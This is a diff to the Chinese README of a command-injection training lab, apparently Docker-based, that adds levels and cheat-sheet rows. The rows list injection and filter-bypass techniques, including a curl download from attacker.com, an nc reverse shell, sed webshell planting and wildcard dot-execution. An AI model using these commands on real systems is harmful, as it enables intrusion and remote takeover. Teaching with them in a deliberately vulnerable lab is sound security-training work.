@@ -77,6 +77,7 @@ docker compose up -d
 | `more` / `less` | 分页浏览文件 | `less /flag` |
 | `nl` | 输出带行号的文件内容 | `nl /flag` |
 | `sort` / `uniq` | 排序 / 去重输出 | `sort /flag` |
+| `fold` / `expand` | 按宽度折叠长行 / 制表符展开为空格 | `fold -w 20 /flag` |
 | `dd` | 跳过偏移、限定长度读取区块 | `dd if=/flag bs=1 skip=0` |
 | `rev` | 逐行反转字符串（需两次 `rev` 还原） | `rev /flag \| rev` |
 | `od` / `xxd` / `hexdump` | 以八进制 / 十六进制转储文件 | `xxd /flag` |
@@ -88,6 +89,7 @@ docker compose up -d
 | `diff` | 两文件逐行差异对比，侧面泄露内容 | `diff /flag /etc/passwd` |
 | `find` | 递归搜索目录树定位目标文件 | `find / -name 'flag*'` |
 | `cp` / `mv` | 复制 / 移动文件至 Web 可访问路径 | `cp /flag /var/www/html/out.txt` |
+| `tee` | 标准输入分流到标准输出与文件 | `tee /var/www/html/out.txt < /flag` |
 | `curl` / `wget` | 下载远程 payload 到本地 | `curl -o shell.php http://attacker.com/shell.txt` |
 | `nc` / `ncat` | 建立 TCP 连接实现反弹 Shell | `nc attacker 4444 -e /bin/sh` |
 | `sed` | 流编辑器——原地替换文件内容植入 Webshell | `sed -i 's/original/payload/' index.php` |
@@ -112,6 +114,7 @@ docker compose up -d
 | `""` 双引号 | 允许变量展开的同时拆分关键字 | `c""at /flag` |
 | `\` 反斜杠 | 转义下一个字符，拆分关键字 | `c\at /flag` |
 | `$@` | 位置参数展开，插入空串拆分关键字 | `c$@at /flag` |
+| Session 文件 + `.` | 先把 payload 写入临时文件，再用点执行 | `. /???/????_*` |
 
 ### 三、无回显 RCE（Blind RCE）
 
@@ -129,7 +132,7 @@ docker compose up -d
 
 ## 关卡一览
 
-> 51 个关卡按知识域分类排列。每个关卡锁定一项特定的命令或绕过技术，需要在该约束下完成 flag 读取。
+> 58 个关卡按知识域分类排列。每个关卡锁定一项特定的命令或绕过技术，需要在该约束下完成 flag 读取。
 
 <details>
 <summary><strong>文件读取类</strong>（关卡 1–22）</summary>
@@ -145,6 +148,8 @@ docker compose up -d
 | 7 | `nl` | 带行号输出 |
 | 8 | `sort` | 排序输出 |
 | 9 | `uniq` | 去重输出 |
+| 9a | `fold` | 按宽度折叠长行 |
+| 9b | `expand` | 制表符展开为空格 |
 | 10 | `dd` | 块截取读取 |
 | 11 | `rev` | 字符串逐行反转 |
 | 12 | `od` | 八进制转储 |
@@ -167,6 +172,7 @@ docker compose up -d
 |:-:|:---|:---|
 | 23 | `cp` | 复制文件至可读目录 |
 | 24 | `mv` | 移动/重命名文件 |
+| 24a | `tee` | 标准输入分流写入 |
 | 25 | `ping` | ICMP + 反引号 OOB 外带 |
 | 26 | `curl` | HTTP 下载 payload |
 | 27 | `echo` | 输出重定向写文件 |
@@ -184,10 +190,12 @@ docker compose up -d
 | 32 | `?` 通配符 | 文件名模糊匹配 |
 | 33 | `*` 通配符 | 文件名模糊匹配 |
 | 34 | `$` 变量拼接 | 关键字拆分 |
+| 34a | `$` 变量定义绕过 WAF | 关键字黑名单 |
 | 35 | `;` 命令分隔 | 单命令限制 |
 | 36 | `&&` 命令串联 | 单命令限制 |
 | 37 | `\|\|` 命令串联 | 单命令限制 |
 | 38 | 反引号优先级 | 执行优先级 |
+| 38a | `$()` 命令替换 | 执行优先级 |
 | 39 | `#` 注释符 | 后缀截断 |
 | 40 | `\t` 制表符 | 空格过滤 |
 | 41 | `$IFS` | 空格过滤 |
@@ -203,11 +211,13 @@ docker compose up -d
 </details>
 
 <details>
-<summary><strong>综合实战</strong>（关卡 51）</summary>
+<summary><strong>综合实战</strong>（关卡 51–53）</summary>
 
 | # | 关卡 | 知识要点 |
 |:-:|:---|:---|
 | 51 | 无回显 RCE | 反弹 Shell / 写 Webshell / OOB 外带 |
+| 52 | 无回显 RCE（带过滤） | 过滤条件下的结果外带 |
+| 53 | 无字母数字 RCE | 黑名单之外：借临时文件与点执行 |
 
 </details>
 
@@ -221,7 +231,8 @@ rce-labs/
 │   ├── index.php          # 入口页（关卡导航）
 │   ├── data.json           # 关卡元数据
 │   ├── core/               # 公共逻辑（关卡框架）
-│   ├── less-1/ ... less-51/ # 各关卡的独立目录
+│   ├── less-1/ ... less-52/ # 各关卡的独立目录（含 9a、9b、24a、34a、38a）
+│   ├── app.js              # 前端交互（主题切换、快捷键、侧边栏定位）
 │   └── style.css           # 全局样式
 ├── config/
 │   └── nginx.conf          # Nginx 配置
@@ -229,16 +240,21 @@ rce-labs/
 │   └── docker-entrypoint.sh # 容器启动脚本
 ├── docker/
 │   └── docker-compose.yaml # Docker Compose 编排
-├── Dockerfile              # 镜像构建文件
-└── deploy.sh               # 部署辅助脚本
+└── Dockerfile              # 镜像构建文件
 ```
 
 ### 添加新关卡
 
 1. 在 `src/` 下创建 `less-N/` 目录
-2. 将 `src/core/less-index.php` 复制到新目录并修改关卡逻辑
-3. 更新 `src/data.json` 注册关卡元数据
-4. 本地测试：
+2. 新建 `index.php`，内容固定为一行，无需修改：
+
+   ```php
+   <?php define('RCE_LABS_LEVEL_DIR', __DIR__); require __DIR__ . '/../core/less-index.php';
+   ```
+
+3. 新建 `demo.php` 编写关卡逻辑，`$pattern` 为黑名单正则，可参考相邻关卡
+4. 更新 `src/data.json` 注册关卡元数据
+5. 本地测试：
 
 ```bash
 cd docker
